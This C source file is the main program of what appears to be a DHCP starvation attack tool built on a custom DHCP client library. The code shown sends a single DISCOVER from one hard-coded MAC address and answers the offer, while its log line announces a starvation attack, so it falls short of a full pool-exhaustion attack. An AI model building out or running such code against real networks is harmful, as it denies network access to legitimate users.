#include "settings/constants.h"
#include "memory/memory.h"
#include "log/logger.h"
#include "dhcp/client/client.h"

logger_t logger;
dhcp_client_t dhcp_client;

void on_offer(dhcp_client_t instance, dhcp_client_offer_data_t data) {
    logger_info(logger, "Received a DHCP OFFER packet");
    dhcp_client_request(instance);
}

void on_ack(dhcp_client_t instance, dhcp_client_ack_data_t data) {
    logger_info(logger, "Received a DHCP ACK packet");
}

int main(int argc, char *argv[]) {
    uint8_t mac[] = {0xC0, 0xB8, 0x83, 0x75, 0x73, 0xA3};

    memory_init();
    logger_create(&logger, "main", CONSTANT_LOG_LEVEL);
    dhcp_client_create(&dhcp_client, on_offer, on_ack);
    dhcp_client_init(dhcp_client);

    logger_info(logger, "Performing DHCP starvation attack");
    dhcp_client_discovery(dhcp_client, mac);

    dhcp_client_destroy(dhcp_client);
    logger_destroy(logger);
    return 0;
}